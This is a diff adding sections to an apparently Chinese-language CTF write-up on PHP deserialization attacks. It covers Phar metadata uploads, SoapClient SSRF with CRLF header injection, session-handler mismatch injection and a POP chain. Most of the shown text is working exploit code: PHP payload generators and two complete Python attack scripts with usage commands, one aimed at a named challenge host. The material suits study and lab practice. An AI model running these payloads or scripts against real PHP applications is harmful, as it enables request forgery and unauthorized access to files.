@@ -1083,7 +1083,7 @@ echo urlencode(serialize($a));
 
 
 
-## 4.
+## 4.ban %
 
 ```
 <?php
@@ -1132,7 +1132,7 @@ $obj = new secret($cmd);
 $ser = serialize($obj);
 echo $ser;
 
-$payload = str_replace('s:12:"' . "\x00secret\x00comm", 'S:12:"\\00secret\\00comm', $ser);
+$payload = str_replace('s:12:"' . "\x00secret\x00comm", 'S:12:"\\00secret\\00comm', $ser); #\x00要换成\\00
 
 echo $payload . "\n";
 ?>
@@ -1173,21 +1173,645 @@ if (isset($filename) and $boo1){
 
 题目给出了源码和文件上传页面。
 
-通过源码可以看见一个黑名单用来防止3
+通过源码可以看见一个黑名单用来防止为我们传入的数值前缀。
+
+不过这边可以利用它在意大小写的方式轻易绕过。
+
+这道题的关键在于，如何传入文件，并使读取文件的时候达成反序列化的触发。
+
+```
+<?php
+class TestObject {
+}
+
+$phar = new Phar("exp.phar"); #创建一个名为 exp.phar 的新 Phar 归档文件对象。
+$phar->startBuffering(); #开始缓冲。这允许程序在一次性写入磁盘之前，对 Phar 文件进行多次修改。
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); #设置 Stub（存根）。这是 Phar 文件的固定格式，必须以 __HALT_COMPILER(); 结尾，否则 PHP 不会将其识别为 Phar 文件。
+
+
+$obj = new TestObject();
+$phar->setMetadata($obj); #将对象 $obj 存入 Phar 文件的元数据（Metadata）中。Phar 存储元数据时会自动调用 serialize() 进行序列化。
+
+$phar->addFromString("test.txt", "test");  #向压缩包内添加一个名为 test.txt 的文件，内容为 "test"。满足 Phar 文件的基本结构要求。
+$phar->stopBuffering(); #停止缓冲并将所有更改写入磁盘上的 exp.phar 文件。
+?>
+```
+
+这边是一个简单的生成我们需要文件的php代码。
+
+生成后直接上传，然后用phar伪协议直接读取就完成了触发反序列化，读取到了flag。
+
+而其实phar伪协议有时候也会被ban，所以这边引入一些其他的读取方式。
+
+![image-20260411191117232](/images/image-20260411191117232.png)
 
 
 
+## 6.php反序列结合crlf发送post请求
+
+```
+<?php
+highlight_file(__FILE__);
+
+$c = unserialize($_GET['param']);
+$c -> daydream();
+
+/*
+In this topic,it is of course possible to pass parameters directly to flag.php, but it is not recommended to use this method to learn SOAP.
+flag.php
+$flag="*";
+$user=$_SERVER['HTTP_USER_AGENT'];
+$pass = $_POST['pass'];
+if(isset($pass) and isset($user)){
+    if($pass=='password' and $user=='admin'){
+        file_put_contents('flag.txt',$flag);
+    }    
+}
+*/
+?>
+<br><a href="../level1">点击进入第十一关</a>
+Fatal error: Call to a member function daydream() on boolean in /var/www/html/index.php on line 5
+```
+
+这边主要是利用一个特殊的漏洞。
+
+![image-20260414194801155](/images/image-20260414194801155.png)
+
+而且还有点版本不兼容的缘故。
+
+`PHP` 的内置类 `SoapClient` 存在一个触发点，跟 `__call` 这个魔术方法的触发类似，都是当调用一个不存在的方法时触发。
+
+触发后， `SoapClient`  去向你设置的 `location` 发起一次 SOAP/HTTP 请求。
+
+然后看题目的注释。
+
+它要求：
+
+```
+if(isset($pass) and isset($user)){
+    if($pass=='password' and $user=='admin'){
+        file_put_contents('flag.txt',$flag);
+    }    
+}
+```
+
+往前看。
+
+```
+$user=$_SERVER['HTTP_USER_AGENT'];
+$pass = $_POST['pass'];
+```
+
+需要设置 `'HTTP_USER_AGENT'` ，还要post传参pass。
+
+而这些内容都必须包含在 `SoapClient`  类发起的请求中。
+
+但是 这个类发起的请求我们无法修改。
+
+所以能做的的就是在注入 `HTTP_USER_AGENT` 的时加上一条正常的post 请求。
+
+这边利用的原理就 `CRLF` 。
+
+> https://cloud.tencent.com/developer/article/1728657
+
+由于每一个部分都是由一个 `\r\n` 分开。
+
+所以我们就自定义一个部分是post传参，然后前后用 `\r\n` 分开。
+
+完成要求。
+
+啧。
+
+感觉本地靶场出不来，不知道为什么，因为我这边正常做，读不到flag。
+
+ai使用py脚本自动化来完成操作也是失败，写不进去。
+
+啧啧啧。
+
+就当是积累个题型，之后找机会复刻一下。
+
+### 通用脚本
+
+```
+import argparse
+import requests
+from urllib.parse import urljoin
+
+def php_s(s: str) -> str:
+    b = s.encode()
+    return f's:{len(b)}:"{s}";'
+
+def php_n() -> str:
+    return 'N;'
+
+def php_b(v: bool) -> str:
+    return f'b:{1 if v else 0};'
+
+def php_i(v: int) -> str:
+    return f'i:{v};'
+
+def php_a0() -> str:
+    return 'a:0:{}'
+
+def build_user_agent(fake_ua: str, post_body: str, add_connection_close: bool = True) -> str:
+    lines = [
+        fake_ua,
+        "Content-Type: application/x-www-form-urlencoded",
+        f"Content-Length: {len(post_body.encode())}",
+    ]
+    if add_connection_close:
+        lines.append("Connection: close")
+    lines.append("")
+    lines.append(post_body)
+    return "\r\n".join(lines)
+
+def build_payload(
+    internal_url: str,
+    uri: str,
+    fake_ua: str,
+    post_body: str,
+    keep_alive: bool = False,
+    exceptions: bool = True,
+    soap_version: int = 1,
+) -> str:
+    ua = build_user_agent(fake_ua, post_body, add_connection_close=(not keep_alive))
+
+    props = [
+        ("\x00SoapClient\x00uri", php_s(uri)),
+        ("\x00SoapClient\x00style", php_n()),
+        ("\x00SoapClient\x00use", php_n()),
+        ("\x00SoapClient\x00location", php_s(internal_url)),
+        ("\x00SoapClient\x00trace", php_b(False)),
+        ("\x00SoapClient\x00compression", php_n()),
+        ("\x00SoapClient\x00sdl", php_n()),
+        ("\x00SoapClient\x00typemap", php_n()),
+        ("\x00SoapClient\x00httpsocket", php_n()),
+        ("\x00SoapClient\x00httpurl", php_n()),
+        ("\x00SoapClient\x00_login", php_n()),
+        ("\x00SoapClient\x00_password", php_n()),
+        ("\x00SoapClient\x00_use_digest", php_b(False)),
+        ("\x00SoapClient\x00_digest", php_n()),
+        ("\x00SoapClient\x00_proxy_host", php_n()),
+        ("\x00SoapClient\x00_proxy_port", php_n()),
+        ("\x00SoapClient\x00_proxy_login", php_n()),
+        ("\x00SoapClient\x00_proxy_password", php_n()),
+        ("\x00SoapClient\x00_exceptions", php_b(exceptions)),
+        ("\x00SoapClient\x00_encoding", php_n()),
+        ("\x00SoapClient\x00_classmap", php_n()),
+        ("\x00SoapClient\x00_features", php_n()),
+        ("\x00SoapClient\x00_connection_timeout", php_i(0)),
+        ("\x00SoapClient\x00_stream_context", php_i(0)),
+        ("\x00SoapClient\x00_user_agent", php_s(ua)),
+        ("\x00SoapClient\x00_keep_alive", php_b(keep_alive)),
+        ("\x00SoapClient\x00_ssl_method", php_n()),
+        ("\x00SoapClient\x00_soap_version", php_i(soap_version)),
+        ("\x00SoapClient\x00_use_proxy", php_n()),
+        ("\x00SoapClient\x00_cookies", php_a0()),
+        ("\x00SoapClient\x00__default_headers", php_n()),
+        ("\x00SoapClient\x00__soap_fault", php_n()),
+        ("\x00SoapClient\x00__last_request", php_n()),
+        ("\x00SoapClient\x00__last_response", php_n()),
+        ("\x00SoapClient\x00__last_request_headers", php_n()),
+        ("\x00SoapClient\x00__last_response_headers", php_n()),
+    ]
+
+    payload = f'O:10:"SoapClient":{len(props)}:{{'
+    for k, v in props:
+        payload += php_s(k) + v
+    payload += '}'
+    return payload
+
+def guess_flag_urls(base_url: str, extra_paths=None):
+    base = base_url if base_url.endswith("/") else base_url + "/"
+    candidates = [
+        urljoin(base, "flag.txt"),
+        urljoin(base, "./flag.txt"),
+        urljoin(base, "../flag.txt"),
+        urljoin(base, "../../flag.txt"),
+    ]
+    if extra_paths:
+        for p in extra_paths:
+            candidates.append(urljoin(base, p))
+    # 去重
+    uniq, seen = [], set()
+    for u in candidates:
+        if u not in seen:
+            uniq.append(u)
+            seen.add(u)
+    return uniq
+
+def main():
+    parser = argparse.ArgumentParser(description="Generic SoapClient unserialize exploit template for lab/CTF.")
+    parser.add_argument("target", help="Vulnerable URL, e.g. http://localhost:8010/")
+    parser.add_argument("--param", default="param", help="GET parameter name, default: param")
+    parser.add_argument("--method", default="daydream", help="Method name to invoke, default: daydream")
+    parser.add_argument("--internal-url", required=True, help="Internal flag.php URL, e.g. http://127.0.0.1:8010/flag.php")
+    parser.add_argument("--uri", default="http://127.0.0.1/", help="SoapClient uri value")
+    parser.add_argument("--fake-ua", default="admin", help="First line of injected User-Agent") #修改代理
+    parser.add_argument("--post-body", default="pass=password", help="Injected POST body")
+    parser.add_argument("--keep-alive", action="store_true", help="Enable keep_alive")
+    parser.add_argument("--no-exceptions", action="store_true", help="Set exceptions=false")
+    parser.add_argument("--soap-version", type=int, default=1, help="SOAP version integer, usually 1")
+    parser.add_argument("--read-path", action="append", default=[], help="Extra flag.txt path to try, repeatable")
+    parser.add_argument("--show-payload", action="store_true", help="Print serialized payload")
+    args = parser.parse_args()
+
+    payload = build_payload(
+        internal_url=args.internal_url,
+        uri=args.uri,
+        fake_ua=args.fake_ua,
+        post_body=args.post_body,
+        keep_alive=args.keep_alive,
+        exceptions=not args.no_exceptions,
+        soap_version=args.soap_version,
+    )
+
+    if args.show_payload:
+        print(payload)
+        print("=" * 60)
+
+    sess = requests.Session()
+
+    print(f"[+] target        : {args.target}")
+    print(f"[+] internal-url  : {args.internal_url}")
+    print(f"[+] param         : {args.param}")
+    print(f"[+] invoke method : {args.method}")
+    print(f"[+] fake ua       : {args.fake_ua!r}")
+    print(f"[+] post body     : {args.post_body!r}")
+    print(f"[+] payload bytes : {len(payload.encode())}")
+
+    try:
+        r = sess.get(args.target, params={args.param: payload}, timeout=10)
+        print(f"[+] trigger status: {r.status_code}")
+        print("[+] response head:")
+        print(r.text[:500])
+    except Exception as e:
+        print(f"[-] trigger failed: {e}")
+        return
+
+    print("\n[+] trying flag paths...")
+    for u in guess_flag_urls(args.target, extra_paths=args.read_path):
+        try:
+            rr = sess.get(u, timeout=6)
+            print(f"    {u} -> {rr.status_code}")
+            if rr.status_code == 200 and rr.text.strip():
+                print("\n[FLAG/CONTENT]")
+                print(rr.text)
+                return
+        except Exception as e:
+            print(f"    {u} -> error: {e}")
+
+    print("\n[-] No flag.txt found in tried locations.")
+
+if __name__ == "__main__":
+    main()
+```
+
+------
+
+最基础的用法
+
+你的本地是 8010 端口，那最常用就是：
+
+```
+python exp.py http://localhost:8010/ --internal-url http://127.0.0.1:8010/flag.php
+```
+
+如果站点里 `flag.php` 不在根目录，再试：
+
+```
+python exp.py http://localhost:8010/ --internal-url http://127.0.0.1:8010/level11/flag.php
+```
+
+如果你怀疑 `flag.txt` 位置也不一样：
+
+```
+python exp.py http://localhost:8010/ \
+  --internal-url http://127.0.0.1:8010/flag.php \
+  --read-path level11/flag.txt \
+  --read-path ../level11/flag.txt
+```
+
+------
+
+参数怎么调
+
+1. `--internal-url`
+
+这是最重要的参数。
+
+它决定 `SoapClient` 最终去打哪里。
+ 这题里真正要命中的就是 `flag.php`。如果地址错了，再好的 payload 也没用。题目注释已经说明 `flag.php` 负责检查 `User-Agent` 和 `pass`，然后写 `flag.txt`。
+
+怎么判断该不该改它
+
+如果你看到：
+
+- 已经触发 `SoapClient->__call()`
+- 但 `flag.txt` 一直没有
+
+第一优先就改这个。
+
+常见尝试
+
+```
+http://127.0.0.1/flag.php
+http://localhost/flag.php
+http://127.0.0.1:8010/flag.php
+http://localhost:8010/flag.php
+http://127.0.0.1:8010/level11/flag.php
+```
+
+------
+
+2. `--post-body`
+
+这题默认是：
+
+```
+pass=password
+```
+
+因为 `flag.php` 读取的是：
+
+```
+$pass = $_POST['pass'];
+if ($pass == 'password') ...
+```
+
+所以这里的内容要跟题目要求一模一样。
+
+改它的场景
+
+如果题目变种里不是 `pass=password`，而是：
+
+- `token=admin`
+- `a=1&b=2`
+- `key=xxxx`
+
+那就改这个参数。
+
+例如：
+
+```
+python exp.py http://localhost:8010/ \
+  --internal-url http://127.0.0.1:8010/flag.php \
+  --post-body "token=admin"
+```
+
+------
+
+3. `--fake-ua`
+
+这题默认是：
+
+```
+admin
+```
+
+因为 `flag.php` 要求：
+
+```
+$user == 'admin'
+```
+
+所以这个参数本质上是 **你伪造的请求头第一行值**。
+
+什么时候改
+
+只有题目要求变了才改。
+ 比如要求 `User-Agent: Mozilla/5.0`，就换成那个。
+
+------
+
+4. `--keep-alive`
+
+默认我建议 **不要开**。
+
+不开时，脚本会自动加：
+
+```
+Connection: close
+```
+
+这对 CRLF 注入这种题通常更稳。
+ 因为你想要的是尽快把你拼好的报文交给后端解析，不想让连接复用带来奇怪影响。
+
+什么时候试开
+
+只有你怀疑目标环境对 `close` 不友好时再试：
+
+```
+python exp.py http://localhost:8010/ \
+  --internal-url http://127.0.0.1:8010/flag.php \
+  --keep-alive
+```
+
+------
+
+5. `--no-exceptions`
+
+有些环境里 `SoapClient` 报错会中断页面显示。
+ 比如你之前见到的：
+
+```
+looks like we got no XML document
+```
+
+这往往说明请求已经打出去了，只是返回值不是 SOAP XML。
+ 如果你想看看不开异常时，页面表现会不会更稳定，可以试：
+
+```
+python exp.py http://localhost:8010/ \
+  --internal-url http://127.0.0.1:8010/flag.php \
+  --no-exceptions
+```
+
+------
+
+6. `--read-path`
+
+这是用来补路径猜测的。
+
+如果脚本默认尝试：
+
+- `/flag.txt`
+- `./flag.txt`
+- `../flag.txt`
+
+都没有，你就加更多候选。
+
+例如：
+
+```
+python exp.py http://localhost:8010/ \
+  --internal-url http://127.0.0.1:8010/flag.php \
+  --read-path level11/flag.txt \
+  --read-path uploads/flag.txt
+```
 
 
 
+## 7.session注入触发 反序列化
+
+```
+<?php
+highlight_file(__FILE__);
+/*hint.php*/
+session_start();
+class Flag{
+    public $name;
+    public $her;
+    function __wakeup(){
+        $this->name=$this->her=md5(rand(1, 10000));
+        if ($this->name===$this->her){
+            include('flag.php');
+            echo $flag;
+        }
+    }
+}
+?>
+<br><a href="../level14">点击进入第十四关</a>
+```
+
+```
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION['a'] = $_GET['a'];
+?>
+```
+
+这是一个典型的 **Session 处理器不一致** 导致的反序列化注入：
+
+`hint.php` 使用 `php_serialize` 方式写 session。
+
+`index.php` 默认使用 `php` 方式读 session。
+
+两种格式不同，导致同一个 session 文件被错读。
+
+`php_serialize`：把整个 `$_SESSION` 当普通 `PHP` 变量序列化，格式类似：
+
+`a:1:{s:1:"a";s:41:"|O:4:"Flag":2:{...}";}`
+
+`php`（默认）：按 `key|serialized_value` 的分隔协议解析，遇到 `|` 会把它当键值分隔符。
+
+给 `$_GET['a']` 传：
+
+`|O:4:"Flag":2:{s:4:"name";N;s:3:"her";N;}`
+
+在 `php_serialize` 写入阶段时，这只是普通字符串。
+
+但在 `php` 读取阶段，解析器会把 `|` 后面当成一个序列化值，从而把 `Flag` 对象反序列化出来。
+
+反序列化后触发 `Flag::__wakeup()`，执行了输出flag。
+
+这道题的知识点很简单，但在实际操作时，直接操作很容易出问题。
+
+因为先是高亮显示源码，然后再启用session，直接操作会导致实际注入触发时，两个网页或者当个网页的session没有变化，从没没有触发反序列化，得到flag。
+
+```
+#!/usr/bin/env python3
+import random
+import re
+import string
+import sys
+from urllib.parse import urljoin
+
+import requests
+
+
+def build_sid(prefix="ctf"):
+    chars = string.ascii_lowercase + string.digits
+    return prefix + "".join(random.choice(chars) for _ in range(16))
+
+
+def normalize_base(base):
+    if not base.startswith("http://") and not base.startswith("https://"):
+        base = "http://" + base
+    return base.rstrip("/") + "/"
+
+
+def extract_flag(text):
+    patterns = [
+        r"Geesec\{[^\r\n<]{1,200}\}",
+        r"flag\{[^\r\n<]{1,200}\}",
+        r"ctf\{[^\r\n<]{1,200}\}",
+        r"[A-Za-z0-9_\-]*\{[0-9a-fA-F\-]{16,}\}",
+    ]
+    for p in patterns:
+        m = re.search(p, text, flags=re.I)
+        if m:
+            return m.group(0)
+    return None
+
+
+def main():
+    base = (
+        sys.argv[1]
+        if len(sys.argv) > 1
+        else "http://80-f09dbe82-da40-4ad5-bc59-923978604ab2.challenge.ctfplus.cn"
+    )
+    base = normalize_base(base)
+
+    injection_path = "hint.php"
+    trigger_path = "index.php"
+    payload = '|O:4:"Flag":2:{s:4:"name";N;s:3:"her";N;}'
+
+    sid = build_sid()
+    injection_url = urljoin(base, injection_path)
+    trigger_url = urljoin(base, trigger_path)
+
+    s = requests.Session()
+    s.headers.update(
+        {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            # 关键：即使服务端报 headers already sent，也能固定同一个 session
+            "Cookie": f"PHPSESSID={sid}",
+        }
+    )
+
+    print(f"[*] Base URL      : {base}")
+    print(f"[*] Injection URL : {injection_url}")
+    print(f"[*] Trigger URL   : {trigger_url}")
+    print(f"[*] PHPSESSID     : {sid}")
+
+    try:
+        r1 = s.get(injection_url, params={"a": payload}, timeout=15)
+        print(f"[+] Inject request sent, status={r1.status_code}, len={len(r1.text)}")
+    except Exception as e:
+        print(f"[-] Injection failed: {e}")
+        sys.exit(1)
+
+    try:
+        r2 = s.get(trigger_url, timeout=15)
+        print(f"[+] Trigger request sent, status={r2.status_code}, len={len(r2.text)}")
+    except Exception as e:
+        print(f"[-] Trigger failed: {e}")
+        sys.exit(1)
+
+    flag = extract_flag(r2.text)
+    if flag:
+        print(f"[+] FLAG FOUND: {flag}")
+        sys.exit(0)
+
+    print("[-] Flag not found in response.")
+    print("[i] Debug tail (last 800 chars):")
+    tail = r2.text[-800:]
+    print(tail)
+    sys.exit(2)
+
+
+if __name__ == "__main__":
+    main()
+
+```
 
 
 
-
-
-
-
-
+## 8.
 
 
 
@@ -1579,6 +2203,123 @@ echo urlencode(serialize($a));
 
 
 ## 4.
+
+```
+
+Warning: file_put_contents(flag.php): failed to open stream: Permission denied in /var/www/html/flag.php on line 13
+<?php
+//flag is in flag.php
+include("flag.php");
+highlight_file(__FILE__);
+class Modifier {
+    private $var;
+    public function append($value)
+    {
+        include($value);
+        echo $flag;
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __toString(){
+        return $this->str->source;
+    }
+    public function __wakeup(){
+        echo $this->source;
+    }
+}
+
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
+    }
+
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
+
+if(isset($_GET['pop'])){
+    unserialize($_GET['pop']);
+}
+?>
+<br><a href="../level10">点击进入第十关</a>
+点击进入第十关
+```
+
+这边最终目的是到达 `Modidier` 的 `__invoke` 方法，将 `$var` 设置为`flag.php`，就可以读取到flag。
+
+根据触发方法来看，只要哪一个方法直接 `return 对象` 就可以触发。
+
+可以 `Test` 的 `__get` 方法，把 `$p` 设置为  `Modidier` 的对象。
+
+触发 `__get` 需要读取一个不存在或者没有权限的属性，可以利用 `Show` 的 `__ToString` 方法，这边 `return $this->str->source` ，轻易就可以触发。
+
+触发 `__ToString` 又需要把对象当字符串。
+
+直接
+
+```
+    public function __wakeup(){
+        echo $this->source;
+```
+
+这样就符合条件。
+
+所以POP链为：
+
+### `Show::__wakeup->Show::__toString->Test::__get->Modifier::__invoke`
+
+```
+<?php
+class Modifier {
+    private $var='flag.php';
+
+}
+
+class Show{
+    public $source;
+    public $str;
+}
+
+class Test{
+    public $p;
+}
+
+$a=new Modifier();
+
+$b=new Test();
+$b->p=$a;
+
+$c=new Show();
+$c->str=$b;
+
+$d=new Show();
+$d->source=$c;
+
+echo urlencode(serialize($d));
+
+?>
+```
+
+
+
+## 5.
+
+
+
+
+
+
+
+
 
 
 
